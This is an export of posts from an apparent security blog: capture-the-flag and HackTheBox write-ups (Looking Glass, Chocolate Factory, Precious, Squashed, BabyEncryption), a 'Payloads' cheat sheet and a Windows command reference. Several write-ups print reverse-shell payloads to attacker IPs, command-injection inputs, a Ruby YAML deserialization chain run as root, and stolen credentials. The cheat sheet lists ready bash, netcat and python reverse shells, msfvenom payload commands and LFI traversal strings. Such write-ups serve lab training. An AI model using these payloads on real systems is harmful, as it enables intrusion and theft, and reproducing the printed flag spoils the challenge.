[{"content":"Cover photo by https://unsplash.com/@jiffystyler\nScenario We\u0026rsquo;ve built the most secure networking tool in the market, come and check it out!\nBegin Address of the website is given. 142.93.37.215:31806\nWhen we press Test button,\nIt runs the ping command. We also have an option to run traceroute command.\nWe can assume that this server takes our input, IP address, runs the ping command on the backend, and prints out the standard output to the frontend.\nLet\u0026rsquo;s try the most common and simple command injection. ; ls and to get the response in timely manner, we can add -c 1 to let ping send only one packet. It looks like this 1.1.1.1 -c 1; ls\nYes, this website is definitely vulnerable to RCE attack and we can achieve it through the command injection. Let\u0026rsquo;s check out the index.php by 1.1.1.1 -c 1; cat index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php function getUserIp() { return $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; } function runTest($test, $ip_address) { if ($test === \u0026#39;ping\u0026#39;) { system(\u0026#34;ping -c4 ${ip_address}\u0026#34;); } if ($test === \u0026#39;traceroute\u0026#39;) { system(\u0026#34;traceroute ${ip_address}\u0026#34;); } } ?\u0026gt; --SNIP-- As we can see in line 11, \u0026ldquo;${ip_address}\u0026rdquo; is being exploited because there is no user input sanitization. When we execute the previous command, it\u0026rsquo;ll look like this\n1 system(\u0026#34;ping -c4 1.1.1.1 -c 1; cat index.php\u0026#34;) I tried to get a reverse shell back to my kali, but it seems the server doesn\u0026rsquo;t allow any connection to other hosts. We have to find the flag manually.\nLet\u0026rsquo;s try this. 1.1.1.1 -c 1; find / -name \u0026quot;*flag*\u0026quot; 2\u0026gt;/dev/null\nWhat\u0026rsquo;s more interesting than the flags in /proc and /sys is /flag_fMpKS.\n1.1.1.1 -c 1; cat /flag_fMpKS\nI finally looked through the rce.\nWe got the flag.\n","date":"2022-12-27T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/lookglass/glass.jpg","permalink":"https://sudo-echo-jin.github.io/p/lookglass/","title":"Looking Glass"},{"content":"I enjoyed watching this movie when I was a kid. This box is made with the theme from the movie Charlie and the Chocolate Factory. Thanks to AndyInfosec team for creating this fun box and reminding me of a good old memories.\nNow it\u0026rsquo;s time to take over the chocolate factory :)\nEnumeration Target IP: 10.10.255.29\nStarting with the port scanning.\nIDENT We see many ports opened, and one of them, 113, runs \u0026ldquo;ident\u0026rdquo; protocol.\nWhat is ident?\nModern day routers, even the cheap ones, they all contain the functionality to block this port. This port should not be allowed to people in general.\nLet\u0026rsquo;s see what information we can retrieve.\nFrom the nmap scan, we know that the target is running web server, so this might be useful later on when investigating the web.\nLets check other ports as well.\nThis is what we got from the port 100. For those of you who forgot the characters in the movie, Mr. Wonka, or Willy Wonka, is the owner of the chocolate factory and Augustus is this boy. All the other ports above 100 returns this message except the port 125.\nFTP Let\u0026rsquo;s see if this server allows anonymous access.\nYes it does.\nList the content and download.\nThere is a file called gum_room.jpg.\nGum room And this is the photo.\nInvestigate if anything is hidden in this jpg file.\nbinwalk strings stegseek We got something from the stegseek.\nCheck out the content.\nWe got a base64 string. Run the following command below.\n1 cat gum_room.jpg.out | base64 -d \u0026gt; decrypted.txt And we got a shadow file that contains the Charlie\u0026rsquo;s password in sha512crypt hash.\n1 2 --SNIPP-- charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::: John comes into play. We don\u0026rsquo;t need to specify the format becaus JTR automatically recognizes it as sha512crypt.\nSave the charlie\u0026rsquo;s shadow info in the file named hash.\nNow we can bruteforce.\nWe got charlie\u0026rsquo;s password.\nHTTP Open the web browser and check the website.\nWe got a web page with the login form.\nLet\u0026rsquo;s check what we got from IDENT port. (http://localhost/key_rev_key)\nIn the web browser, type http://10.10.255.29/key_rev_key and we get a file called key_rev_key.\nIt is a ELF 64-bit file. Let\u0026rsquo;s run it.\nIt doesn\u0026rsquo;t like my name.\nLet\u0026rsquo;s do simple investigation on what libraries and functions this executable is calling.\nLooks like this program is written in C and calls \u0026ldquo;printf\u0026rdquo;, \u0026ldquo;scanf\u0026rdquo;, \u0026ldquo;puts\u0026rdquo;, and \u0026ldquo;strcmp\u0026rdquo;.\nIt also leaks the string value that my name is being compared to. laksdhfas.\nLet\u0026rsquo;s rerun it with the name laksdhfas.\nWe got a key, but don\u0026rsquo;t know yet where it\u0026rsquo;s gonna be used.\nFoothold \u0026amp; User flag \u0026ldquo;While I was writing this post, machine time expired, so I restarted a machine and got new target IP: 10.10.124.206\u0026rdquo;\nWe have charlie\u0026rsquo;s password from the FTP section. Let\u0026rsquo;s login.\nSince the credential came from the shadow file, I thought it is obviously the ssh credential, but wasn\u0026rsquo;t true. One more place we could use this is the login form in the web.\nLogin was successful and we are now in the squirrel room. This room let us execute commands.\nSetup a listener\nPayload\n/bin/bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.2.19.132/7777 0\u0026gt;\u0026amp;1\u0026quot;\nExecute it.\nAnd we are in.\nLateral Movement Navigate to user charlie\u0026rsquo;s home directory and we see some interesting files.\nThe content of teleport.pub\nThe content of teleport\nThis is the ssh private key with the weak permission set.\nLet\u0026rsquo;s login to charlie\u0026rsquo;s account using this private key. Copy the key into a file named \u0026lsquo;id_rsa\u0026rsquo; and give it a 600 permission.\nssh -i id_rsa charlie@10.10.124.206\nWe are now charlie.\nWe got a user flag.\nPrivesc \u0026amp; Root flag Let\u0026rsquo;s first check if charlie has any sudo privilege.\nThis is going to be really simple privesc. We can run vi editor in root\u0026rsquo;s privilege without charlie\u0026rsquo;s password (good thing because we don\u0026rsquo;t know charlie\u0026rsquo;s password).\nExecute sudo /usr/bin/vi\nAnd we are now in a default vi editor.\nType :!bash\nEnter\nWe got root shell.\nNavigate to the root\u0026rsquo;s home directory and instead of a flag, we see a python script called root.py.\n1 2 3 4 5 6 7 8 9 10 11 12 from cryptography.fernet import Fernet import pyfiglet key=input(\u0026#34;Enter the key: \u0026#34;) f=Fernet(key) encrypted_mess= \u0026#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ\u0026#39; dcrypt_mess=f.decrypt(encrypted_mess) mess=dcrypt_mess.decode() display1=pyfiglet.figlet_format(\u0026#34;You Are Now The Owner Of \u0026#34;) display2=pyfiglet.figlet_format(\u0026#34;Chocolate Factory \u0026#34;) print(display1) print(display2) print(mess) The content of root.py\nWe already have a key from the binary key_rev_key.\nb\u0026rsquo;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026rsquo;\nSo, we can fix this code since that way, it\u0026rsquo;s easier to pass the byte string to the key variable. Also, the original code yields some errors.\nModified code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from cryptography.fernet import Fernet import pyfiglet #key=input(\u0026#34;Enter the key: \u0026#34;) \u0026lt;\u0026lt; change this key = b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39; # to this f=Fernet(key) encrypted_mess= \u0026#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ\u0026#39; #dcrypt_mess=f.decrypt(encrypted_mess) \u0026lt;\u0026lt; change this dcrypt_mess=f.decrypt(encrypted_mess.encode()) # to this. f.decrypt(token) \u0026lt;\u0026lt; token has to be in byte format mess=dcrypt_mess.decode() display1=pyfiglet.figlet_format(\u0026#34;You Are Now The Owner Of \u0026#34;) display2=pyfiglet.figlet_format(\u0026#34;Chocolate Factory \u0026#34;) print(display1) print(display2) print(mess) Run root.py\nYou are now the owner of chocolate factory\nAnd we got a root flag.\nChocolate Factory pwned.\n","date":"2022-12-25T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/chocolate/cover.png","permalink":"https://sudo-echo-jin.github.io/p/chocolate/","title":"Charlie and the Chocolate Factory"},{"content":"Enumeration Start with nmap scan\n1 nmap -sV 10.10.11.189 -oN nmap.out SSH and HTTP are running.\nHTTP Open in browser\nWe get redirected to virtual host running with the name \u0026ldquo;precious.htb\u0026rdquo;\nAdd precious.htb to /etc/hosts and reload the page. We get a webpage which converts a website into pdf.\nLet\u0026rsquo;s give it a sample by hosting a simple webserver with python.\nDownloaded the pdf with the name converted.pdf\nInvestigate the metadata if we can get anything\nFrom the last row, we can verify that this PDF was generated with the program named pdfkit v0.8.6\nThere\u0026rsquo;s a CVE-2022-25765 published, which states that this version of pdfkit is vulnerable to command injection. For more info about CVE-2022-25765\nFoothold \u0026amp; User flag Setup a listener on port 7777\nPayload\nhttp://10.10.14.6/?name=#{'%20`/bin/bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/7777 0\u0026gt;\u0026amp;1\u0026quot;`'}\nClick submit and we are in.\nNavigate to /home\nThere are two users on this system. Navigate to ruby\u0026rsquo;s home directory.\nThe user flag is not in ruby\u0026rsquo;s home dir. Then it must be in henry\u0026rsquo;s.\nLateral Movement One simple thing we can try to find any leads to get henry\u0026rsquo;s credential is to search for any files that contain the username henry. Let\u0026rsquo;s give it a try in ruby\u0026rsquo;s home directory.\nFound one in .bundle/config file\nhenry:Q3c1AqGHtoI0aXAYFH\nLog into henry\u0026rsquo;s account.\nWe are now henry.\nWe got the user flag.\nPrivesc \u0026amp; Root flag Check if henry has a sudo privilege.\nHenry can run sudo without the password to run update_dependencies.rb. There might be an another vulnerability.\nThe directory structure.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # Compare installed dependencies with those specified in \u0026#34;dependencies.yml\u0026#34; require \u0026#34;yaml\u0026#34; require \u0026#39;rubygems\u0026#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\u0026#34;dependencies.yml\u0026#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \u0026#34;Installed version differs from the one specified in file: \u0026#34; + local_name else puts \u0026#34;Installed version is equals to the one specified in file: \u0026#34; + local_name end end end end The content of update_dependencies.rb. This ruby script reads the content from the file dependencies.yml and does some version comparison.\n1 2 yaml: 0.1.1 pdfkit: 0.8.6 And this is a sample dependencies.yml.\nThe vulnerability exists in line 10, where it loads the content from the file dependencies.yml. When it references the file name, it is not written in the form of absolute path. Since it\u0026rsquo;s stated in the form of relative path, we can take advantage of this by creating our own dependencies.yml file in our own directory. To simply put, we have the control over dependencies.yml file.\nWe will put malicious contents in our own dependencies.yml, referencing this resource.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: \u0026amp;1 !ruby/object:Net::BufferedIO io: \u0026amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \u0026#34;abc\u0026#34; debug_output: \u0026amp;1 !ruby/object:Net::WriteAdapter socket: \u0026amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module \u0026#39;Kernel\u0026#39; method_id: :system git_set: id method_id: :resolve Created a malicious yaml file in henry\u0026rsquo;s home directory which runs the command id in line 18.\nCheck the result.\nIt prints out a whole bunch of errors, but if you look closely, our command id is executed with the root\u0026rsquo;s privilege. The ruby script looks for a file dependencies.yml in the location where the script was executed. Since we executed the script in henry\u0026rsquo;s home directory, it will look for dependencies.yml in henry\u0026rsquo;s home directory, which is our malicious payload. It is why it\u0026rsquo;s important to state commands or names of files in the form of absolute path so that it executes or loads file from the intended location.\nWe can achieve a root shell by changing line 18 in our dependencies.yml file.\nPut /bin/bash instead of id\nExcute again.\nAnd we got a root shell.\nThe root flag.\nMachine pwned.\n","date":"2022-12-24T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/precious/Precious.png","permalink":"https://sudo-echo-jin.github.io/p/precious/","title":"Precious"},{"content":"Cover photo by https://unsplash.com/@invent\nScenario \u0026ldquo;You are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?\u0026rdquo; - HTB challenge\nLet\u0026rsquo;s begin We\u0026rsquo;re given two files from the zip file, msg.enc and chall.py.\nThe content of the msg.enc\nThe content of the chall.py\nIt seems like the encryption algorithm used to generate msg.enc. There we can see that MSG is imported from the \u0026ldquo;secret\u0026rdquo; which we are trying to recover. If you take a closer look into the encryption function, there is a modulo operation used, which indicates that it is impossible to make a symmetrical decrypting equation (well, at least in my head).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string # from secret import MSG def encryption(msg): ct = [] for char in msg: ct.append((123 * char + 18) % 256) return bytes(ct) #ct = encryption(MSG) # f = open(\u0026#39;./msg.enc\u0026#39;,\u0026#39;w\u0026#39;) # f.write(ct.hex()) # f.close() sample1 = b\u0026#39;a\u0026#39; sample2 = b\u0026#39;ab\u0026#39; ct1 = encryption(sample1) ct2 = encryption(sample2) print(ct1.hex()) print(ct2.hex()) Modified some codes to see how this works.\nThe output:\n1 2 ad # from b\u0026#39;a\u0026#39; ad28 # from b\u0026#39;ab\u0026#39; This encryption algorithm takes each bytes in the string, does some maths, and prints out in the \u0026lsquo;double digit\u0026rsquo; hex format.\n\u0026lsquo;a\u0026rsquo; -\u0026gt; \u0026lsquo;ad\u0026rsquo;,\n\u0026lsquo;b\u0026rsquo; -\u0026gt; \u0026lsquo;28\u0026rsquo;\nWith knowing all these, one thing we can try is to map all printable characters to those encrypted hex outputs. At the end, we can split the encrypted message by chunk of two bytes and use the map to convert those back to plain text.\nExample:\nsecret = 6e0a9372ec49a3\n6e0a9372ec49a3 -\u0026gt; 6e|0a|93|72|ec|49|a3 -\u0026gt; map[\u0026lsquo;62\u0026rsquo;], map[\u0026lsquo;0a\u0026rsquo;], map[\u0026lsquo;93\u0026rsquo;], map[\u0026lsquo;72\u0026rsquo;] \u0026hellip;\nDecryption code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import string def createMap(msg): MAP = dict() for char in msg: enc = (123 * char + 18) % 256 ct = hex(enc)[2:].zfill(2) # Just in case if the hex is only one digit. ex) 0xa \u0026gt; 0x0a MAP[ct] = chr(char) return MAP S = string.printable.encode() # Assign all printable characters in byte format to variable \u0026#39;S\u0026#39; MAP = createMap(S) secret = input(\u0026#39;\\nEnter encrypted message:\\n\\n\u0026#39;) print(\u0026#39;\\n\\nRecovered message:\\n\u0026#39;) for i in range(0, len(secret), 2): ct = secret[i:i+2] print(MAP[ct], end=\u0026#39;\u0026#39;) print() Content of MAP variable above:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 22 -\u0026gt; 0 9d -\u0026gt; 1 18 -\u0026gt; 2 93 -\u0026gt; 3 0e -\u0026gt; 4 89 -\u0026gt; 5 04 -\u0026gt; 6 7f -\u0026gt; 7 fa -\u0026gt; 8 75 -\u0026gt; 9 ad -\u0026gt; a 28 -\u0026gt; b a3 -\u0026gt; c 1e -\u0026gt; d 99 -\u0026gt; e 14 -\u0026gt; f 8f -\u0026gt; g 0a -\u0026gt; h 85 -\u0026gt; i 00 -\u0026gt; j 7b -\u0026gt; k f6 -\u0026gt; l 71 -\u0026gt; m ec -\u0026gt; n 67 -\u0026gt; o e2 -\u0026gt; p 5d -\u0026gt; q d8 -\u0026gt; r 53 -\u0026gt; s ce -\u0026gt; t 49 -\u0026gt; u c4 -\u0026gt; v 3f -\u0026gt; w ba -\u0026gt; x 35 -\u0026gt; y b0 -\u0026gt; z 4d -\u0026gt; A c8 -\u0026gt; B 43 -\u0026gt; C be -\u0026gt; D 39 -\u0026gt; E b4 -\u0026gt; F 2f -\u0026gt; G aa -\u0026gt; H 25 -\u0026gt; I a0 -\u0026gt; J 1b -\u0026gt; K 96 -\u0026gt; L 11 -\u0026gt; M 8c -\u0026gt; N 07 -\u0026gt; O 82 -\u0026gt; P fd -\u0026gt; Q 78 -\u0026gt; R f3 -\u0026gt; S 6e -\u0026gt; T e9 -\u0026gt; U 64 -\u0026gt; V df -\u0026gt; W 5a -\u0026gt; X d5 -\u0026gt; Y 50 -\u0026gt; Z ed -\u0026gt; ! 68 -\u0026gt; \u0026#34; e3 -\u0026gt; # 5e -\u0026gt; $ d9 -\u0026gt; % 54 -\u0026gt; \u0026amp; cf -\u0026gt; \u0026#39; 4a -\u0026gt; ( c5 -\u0026gt; ) 40 -\u0026gt; * bb -\u0026gt; + 36 -\u0026gt; , b1 -\u0026gt; - 2c -\u0026gt; . a7 -\u0026gt; / f0 -\u0026gt; : 6b -\u0026gt; ; e6 -\u0026gt; \u0026lt; 61 -\u0026gt; = dc -\u0026gt; \u0026gt; 57 -\u0026gt; ? d2 -\u0026gt; @ cb -\u0026gt; [ 46 -\u0026gt; \\ c1 -\u0026gt; ] 3c -\u0026gt; ^ b7 -\u0026gt; _ 32 -\u0026gt; ` 2b -\u0026gt; { a6 -\u0026gt; | 21 -\u0026gt; } 9c -\u0026gt; ~ 72 -\u0026gt; 65 -\u0026gt; e0 -\u0026gt; 51 -\u0026gt; 5b -\u0026gt; d6 -\u0026gt; Result:\nThe nuclear will arrive on friday.\nAnd we got the flag.\nHTB{l00k_47_y0u_r3v3rs1ng_3qu4710n5_c0ngr475}\n","date":"2022-12-21T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/babyencryption/baby.jpg","permalink":"https://sudo-echo-jin.github.io/p/babyencryption/","title":"BabyEncryption"},{"content":"Enumeration Our target\u0026rsquo;s IP address is 10.10.11.191.\nLet\u0026rsquo;s begin with port scanning.\nWe can see that SSH, HTTP, and NFS is running.\nHTTP Firstly, checked the website, but there was nothing interesting or vulnerable. Links were redirections to current page. (#)\nNFS From the scan result, we can see port 111 and 2049 opened, which means the NFS protocol is running. Let\u0026rsquo;s check the list of available exports.\nThere are two exports allowed to anyone (*). Create two directories and let\u0026rsquo;s mount them respectively to our local system.\nAs we can see above in the screenshot, it seems like the /var/www/html directory is owned by a user whose uid is 2017, and the user ross\u0026rsquo;s uid is 1001 on their system. Let\u0026rsquo;s check the common vulnerability vector, no_root_squash.\nno_root_squash is not set. Then what about normal users? Let\u0026rsquo;s make two new users with the uid 2017 and 1001.\nWith these two users, checked if any of these are writable and yes, we can write stuffs in mnt1 share which is web root.\nFoothold \u0026amp; User flag If we can write something into the /var/www/html, this is such a big red flag and this is a way to get the initial foothold to the target system. We can upload malicious php payload in this directory to spawn a reverse shell. We will use one of the most famous payload, pentestermonkey\u0026rsquo;s php-reverse-shell.php (https://pentestmonkey.net/tools/web-shells/php-reverse-shell).\nSetup a netcat listener on port 9999 and execute the payload with the curl command or directly accessing through the web browser.\nWe got in. It seems like the user alex is the one whose uid is 2017. We should upgrade our shell first.\nNavigated to alex\u0026rsquo;s home directory and found the user flag.\nPrivesc \u0026amp; Root flag After basic enumeration with linpeas, user ross is currently logged into the system, running on the gnome session on tty7.\nLet\u0026rsquo;s go back to the NFS share of /home/ross mounted on mnt2 on our local system since alex doesn\u0026rsquo;t have permission to fully view ross\u0026rsquo;s home directory. But remember that we can impersonate ross due to misconfiguration in NFS service.\nThere are many files but we have to focus on the files that are only readable by the user ross which cannot be seen with the alex\u0026rsquo;s user account inside the target system. The most intriguing one of them is .Xauthority file, since we know ross is running a graphical environment.\nhttps://askubuntu.com/questions/300682/what-is-the-xauthority-file\nAlso looking into .xsession-errors, we get some more information.\nRoss is running lightdm and it is likely that ross is running on DISPLAY:0. We can verify it by taking a screenshot using the credential cookie from .Xauthority.\nCopy .Xauthority to target machine so that alex can import it.\n1 2 3 4 5 6 7 # On Attacker\u0026#39;s machine in ross\u0026#39;s nfs share cat .Xauthority | base64 # On Target\u0026#39;s machine echo COPIED_BASE64_STRING | base64 -d \u0026gt; copied_cred export XAUTHORITY=/home/alex/copied_cred xwd -root -display :0 -out screenshot.xwd Exported the ross\u0026rsquo;s Xauthority cookie and tried to take screenshot. (Had some trouble with the xwd syntax)\nOnce the screenshot is taken, let\u0026rsquo;s transport it back to our local machine and see the picture. Copied the file remotely with the python simple web server and converted the xwd image to png. This time, instead of base64, we use python webserver because the base64 on image data could yield too much text output.\n1 2 3 4 5 6 # On Target\u0026#39;s machine python -m http.server # host the server # On Attacker\u0026#39;s machine wget 10.10.11.191:8000/screenshot.xwd convert screenshot.xwd png.png Open png.png We got root password. \u0026ldquo;cah$mei7rai9A\u0026rdquo;\nWe got the root flag.\nIt is easy to fall into a rabit hole when people are investigating the ross\u0026rsquo;s home directory via NFS share and find the KeePass database file. I also spent a lot of time on trying to crack the KeePass database. However, ross was actually running this program on the GUI and the way to get this was to steal ross\u0026rsquo;s Xauth cookie to see ross\u0026rsquo;s screen.\nMachine pwned.\n","date":"2022-12-20T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/squashed/Squashed.png","permalink":"https://sudo-echo-jin.github.io/p/squashed/","title":"Squashed"},{"content":"Cover photo by https://unsplash.com/@switch_dtp_fotografie\nCommon 1 2 3 4 5 6 7 8 9 10 11 # bash bash -i \u0026gt;\u0026amp; /dev/tcp/1.3.3.7/1337 0\u0026gt;\u0026amp;1 /bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.3.3.7/1337 0\u0026gt;\u0026amp;1\u0026#34; # mkfifo - sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 1.3.3.7 1337 \u0026gt;/tmp/f # python3 - sh export RHOST=\u0026#34;10.2.19.132\u0026#34;;export RPORT=7777;python3 -c \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; # More on reverse shell generator Msfvenom 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Stageless msfvenom -p linux/x64/shell_reverse_tcp lhost=1.3.3.7 lport=1337 -f elf \u0026gt; shell.elf msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=1.3.3.7 lport=1337 -f elf \u0026gt; meter.elf msfvenom -p window/x64/shell_reverse_tcp lhost=1.3.3.7 lport=1337 -f exe \u0026gt; shell.exe msfvenom -p window/x64/meterpreter_reverse_tcp lhost=1.3.3.7 lport=1337 -f exe \u0026gt; meter.exe # Staged msfvenom -p linux/x64/shell/reverse_tcp lhost=1.3.3.7 lport=1337 -f elf \u0026gt; shell.elf msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=1.3.3.7 lport=1337 -f elf \u0026gt; meter.elf msfvenom -p window/x64/shell/reverse_tcp lhost=1.3.3.7 lport=1337 -f exe \u0026gt; shell.exe msfvenom -p window/x64/meterpreter/reverse_tcp lhost=1.3.3.7 lport=1337 -f exe \u0026gt; meter.exe # Web msfvenom -p php/meterpreter_reverse_tcp lhost=1.3.3.7 lport=1337 -f raw \u0026gt; meter.php LFI 1 2 3 4 5 6 /etc/passwd ../../../../../../etc/passwd ../../../../../../etc/passwd%00 # works on php version \u0026lt;= 5.3.4 %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd # url encode %252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd # url encode twice php://filter/convert.base64-encode/resource=PAYLOAD # wrapper ","date":"2022-12-19T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg","permalink":"https://sudo-echo-jin.github.io/p/file-inclusion/","title":"Payloads"},{"content":"Cover photo by https://unsplash.com/@slrncl\nCommands Services 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # List all running services Get-Service | ? {$_.Status -eq \u0026#34;Running\u0026#34;} | select -First 2 |fl tasklist /svc # Handle specific service sc qc SERVICE_NAME # Query service sc start SERVICE_NAME sc stop SERVICE_NAME sc config SERVICE_NAME KEY=VALUE # ex) sc config wuauserv binPATH=C:\\Windows\\pwn.exe sc sdshow SERVICE_NAME # List running application under currently logged in user reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run # Query specific service with the registry (returns more info than sc) Get-ACL -Path HKLM:\\PATH\\TO\\SERVICE # Check Windows Defender Status Get-MpComputerStatus # List AppLocker Rules Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # Test AppLocker Policy Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path PATH_TO_FILE -User USER Scripts 1 2 3 4 5 6 .\\SCRIPT.ps1 # Execute script .\\SCRIPT.ps1;MODULE # Excute particular module from the script Import-Module .\\SCRIPT.ps1 # Import modules from the script Get-Module # List all loaded modules Get-ExecutionPolicy -List Set-ExecutionPolicy POLICY -Scope SCOPE # Can set policy if proper rights given. Limited to user session Windows Management Instrumentation (WMI) 1 2 3 4 5 # The command \u0026#34;wmic\u0026#34; is suited for CMD where as Powershell utilizes \u0026#34;Get-WmiObject\u0026#34; and \u0026#34;Invoke-WmiMethod wmic # Used in CMD Get-WmiObject # Get instances or information of WMI classes Get-WmiObject win32_useraccount # List user accounts with sid Invoke-WmiMethod # Get methods of WMI objects MISC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Environment set systeminfo # Check quick fix wmic qfe Get-HotFix | ft -AutoSize # pwsh # List installed programs wmic product get name Get-WmiObject -Class Win32_Product | select Name, Version # pwsh # User \u0026amp; Group query user # w in linux net user # list users net localgroup # list groups net localgroup GROUP # list members of the group ","date":"2022-12-19T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/windows-resource/window.jpg","permalink":"https://sudo-echo-jin.github.io/p/windows-resource/","title":"Windows Fundamental"}]